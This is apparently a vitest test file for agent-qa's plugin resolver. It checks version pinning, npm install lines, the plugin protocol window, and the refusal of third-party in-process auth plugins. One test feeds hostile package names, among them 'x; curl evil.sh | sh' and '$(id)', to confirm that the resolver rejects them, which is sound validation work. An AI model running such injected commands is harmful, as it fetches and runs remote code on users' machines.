import { join } from 'node:path'

import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import {
  pluginInstallLine,
  resolvePluginEntry,
  selectInProcessPluginEntries,
  supportedPluginProtocols,
} from '../resolve-entries.js'
import {
  createFixtureRoot,
  inProcessManifest,
  installPluginPackage,
  remoteManifest,
  writePluginPackage,
  type FixtureRoot,
} from './plugin-fixtures.js'

const VERSION = '1.4.0'
const SCRIPTED = '@vostride/agent-qa-plugin-scripted'
const ACME = '@acme/agent-qa-plugin-scripted'
const SUBSCRIPTION = '@vostride/agent-qa-subscription-auth'

let fixture: FixtureRoot
let options: { configDir: string; agentQaVersion: string }

beforeEach(() => {
  fixture = createFixtureRoot('plugin-compatibility-')
  options = { configDir: fixture.configDir, agentQaVersion: VERSION }
})

afterEach(() => {
  fixture.remove()
})

function installInProcess(name: string, kind: 'model-auth' | 'model-provider', version = '0.1.0') {
  installPluginPackage(fixture.configDir, name, version, inProcessManifest(kind))
}

function resolvePackage(name: string, packageName: string) {
  return resolvePluginEntry({ name, package: packageName }, options)
}

describe('first-party plugin versions', () => {
  it('accepts a first-party plugin at the same version as agent-qa', () => {
    installPluginPackage(fixture.configDir, SCRIPTED, VERSION, remoteManifest({ protocol: 99 }))

    expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options)).toMatchObject({
      origin: 'first-party',
      state: 'ok',
      version: VERSION,
    })
  })

  it('refuses a first-party plugin at another version with the exact install line', () => {
    installPluginPackage(fixture.configDir, SCRIPTED, '1.3.9', remoteManifest())

    expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options)).toMatchObject({
      state: 'version_mismatch',
      install: `npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}`,
      reason:
        `Plugin entry scripted names ${SCRIPTED} at 1.3.9, and agent-qa is at ${VERSION}. `
        + `Run npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}.`,
    })
  })

  it('compares versions as strings, so a prerelease of the same version is another version', () => {
    installPluginPackage(fixture.configDir, SCRIPTED, `${VERSION}-rc.1`, remoteManifest())

    expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options).state).toBe(
      'version_mismatch',
    )
  })
})

describe('install lines', () => {
  it('pins a first-party plugin to the agent-qa version', () => {
    expect(pluginInstallLine({ name: 'scripted', package: SCRIPTED }, VERSION)).toBe(
      `npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}`,
    )
  })

  it('names a third-party package as declared, with no version', () => {
    expect(pluginInstallLine({ name: 'acme', package: ACME }, VERSION)).toBe(
      `npm install --save-dev ${ACME}`,
    )
  })

  it('has no install line for a path', () => {
    expect(pluginInstallLine({ name: 'local', path: './tools/acme' }, VERSION)).toBeUndefined()
  })

  it.each(['x; curl evil.sh | sh', '@vostride/agent-qa-plugin-x/../../evil', '$(id)', '..'])(
    'builds no install line from %j, which is not an npm package name',
    (hostile) => {
      expect(pluginInstallLine({ name: 'acme', package: hostile }, VERSION)).toBeUndefined()

      const resolved = resolvePluginEntry({ name: 'acme', package: hostile }, options)

      expect(resolved).toMatchObject({
        state: 'not_installed',
        reason:
          'Plugin entry acme names a package that is not an npm package name. Fix package in '
          + 'plugins, or name a folder with path.',
      })
      expect(resolved.install).toBeUndefined()
      expect(resolved.reason).not.toContain('npm install')
    },
  )

  it('gives a missing first-party plugin its pinned install line', () => {
    expect(resolvePluginEntry({ name: 'scripted', package: SCRIPTED }, options)).toMatchObject({
      state: 'not_installed',
      reason:
        `Plugin entry scripted names ${SCRIPTED}, which is not installed. `
        + `Run npm install --save-dev --save-exact ${SCRIPTED}@${VERSION}.`,
    })
  })
})

describe('the protocol window for third-party and path plugins', () => {
  function resolveAtProtocol(protocol: number) {
    installPluginPackage(fixture.configDir, ACME, '2.0.0', remoteManifest({ protocol }))
    return resolvePluginEntry(
      { name: 'acme', package: ACME },
      { ...options, protocols: { current: 3 } },
    )
  }

  it('is the current protocol and the one before it', () => {
    expect(supportedPluginProtocols(3)).toEqual([3, 2])
    expect(supportedPluginProtocols(1)).toEqual([1])
  })

  it('refuses an older protocol, naming the kit version to rebuild with', () => {
    expect(resolveAtProtocol(1)).toMatchObject({
      state: 'protocol_mismatch',
      reason:
        `Plugin entry acme names ${ACME}, which speaks plugin protocol 1; this agent-qa speaks `
        + `3 and 2. Rebuild the plugin with @vostride/agent-qa-plugin-kit@${VERSION}.`,
    })
  })

  it('accepts the protocol before the current one', () => {
    expect(resolveAtProtocol(2).state).toBe('ok')
  })

  it('accepts the current protocol', () => {
    expect(resolveAtProtocol(3).state).toBe('ok')
  })

  it('refuses a newer protocol, saying to update agent-qa', () => {
    expect(resolveAtProtocol(4)).toMatchObject({
      state: 'protocol_mismatch',
      reason:
        `Plugin entry acme names ${ACME}, which speaks plugin protocol 4, newer than this `
        + "agent-qa's 3. Update agent-qa.",
    })
  })

  it('checks a path plugin by protocol too', () => {
    writePluginPackage(join(fixture.configDir, 'tools', 'acme'), {
      name: 'acme-local',
      version: '0.0.1',
      'agent-qa': { plugin: remoteManifest({ protocol: 1 }) },
    })

    expect(
      resolvePluginEntry(
        { name: 'local', path: './tools/acme' },
        { ...options, protocols: { current: 3 } },
      ).state,
    ).toBe('protocol_mismatch')
  })
})

describe('in-process plugins', () => {
  it('refuses a third-party package that declares model auth', () => {
    installInProcess('@acme/agent-qa-auth', 'model-auth', '2.0.0')

    expect(resolvePackage('acme', '@acme/agent-qa-auth')).toMatchObject({
      state: 'bad_manifest',
      reason:
        'Plugin entry acme names @acme/agent-qa-auth, which declares a model-auth plugin; only '
        + '@vostride/agent-qa-* packages load inside agent-qa. Remove the entry.',
    })
  })

  it('refuses a path that declares a model provider', () => {
    writePluginPackage(join(fixture.configDir, 'tools', 'provider'), {
      name: 'acme-provider',
      version: '0.0.1',
      'agent-qa': { plugin: inProcessManifest('model-provider') },
    })

    expect(resolvePluginEntry({ name: 'local', path: './tools/provider' }, options)).toMatchObject({
      state: 'bad_manifest',
      reason:
        'Plugin entry local names ./tools/provider, which declares a model-provider plugin; only '
        + '@vostride/agent-qa-* packages load inside agent-qa. Remove the entry.',
    })
  })

  it('reads the subscription-auth package without a manifest as in-process model auth', () => {
    installPluginPackage(fixture.configDir, SUBSCRIPTION, '0.3.1', undefined, {
      exports: { '.': { import: './dist/index.js' } },
    })

    expect(resolvePackage('subscription', SUBSCRIPTION)).toMatchObject({
      origin: 'first-party',
      state: 'ok',
      inProcess: true,
      manifest: { kind: 'model-auth', runs: 'in-process', entry: './dist/index.js' },
    })
  })

  it('accepts a first-party package that declares a model provider', () => {
    installInProcess('@vostride/agent-qa-acme', 'model-provider')

    expect(resolvePackage('acme', '@vostride/agent-qa-acme')).toMatchObject({
      origin: 'first-party',
      state: 'ok',
      inProcess: true,
      manifest: { kind: 'model-provider' },
    })
  })
})

describe('selecting in-process entries', () => {
  function installMixedList() {
    installInProcess('@vostride/agent-qa-acme-auth', 'model-auth')
    installPluginPackage(fixture.configDir, SCRIPTED, VERSION, remoteManifest())
    installInProcess('@acme/agent-qa-auth', 'model-auth', '2.0.0')
    return [
      { name: 'first', package: '@vostride/agent-qa-acme-auth' },
      { name: 'scripted', package: SCRIPTED },
      { name: 'acme', package: '@acme/agent-qa-auth' },
      { name: 'subscription', package: SUBSCRIPTION },
      { name: 'gone', package: '@acme/never-installed' },
    ]
  }

  it('loads first-party model auth, refusing third-party and missing subscription auth', () => {
    const selection = selectInProcessPluginEntries(installMixedList(), 'model-auth', options)

    expect(selection.load.map((entry) => entry.name)).toEqual(['first'])
    expect(selection.refusals).toEqual([
      {
        entry: 'acme',
        state: 'bad_manifest',
        reason:
          'Plugin entry acme names @acme/agent-qa-auth, which declares a model-auth plugin; only '
          + '@vostride/agent-qa-* packages load inside agent-qa. Remove the entry.',
      },
      {
        entry: 'subscription',
        state: 'not_installed',
        reason:
          `Plugin entry subscription names ${SUBSCRIPTION}, which is not installed. `
          + `Run npm install --save-dev ${SUBSCRIPTION}.`,
      },
    ])
  })

  it('loads and refuses nothing for model providers from the same list', () => {
    expect(selectInProcessPluginEntries(installMixedList(), 'model-provider', options)).toEqual({
      load: [],
      refusals: [],
    })
  })

  it('keeps declaration order among the loaded entries', () => {
    installInProcess('@vostride/agent-qa-b-auth', 'model-auth')
    installInProcess('@vostride/agent-qa-a-auth', 'model-auth')

    const selection = selectInProcessPluginEntries(
      [
        { name: 'b', package: '@vostride/agent-qa-b-auth' },
        { name: 'a', package: '@vostride/agent-qa-a-auth' },
      ],
      'model-auth',
      options,
    )

    expect(selection.load.map((entry) => entry.name)).toEqual(['b', 'a'])
  })
})
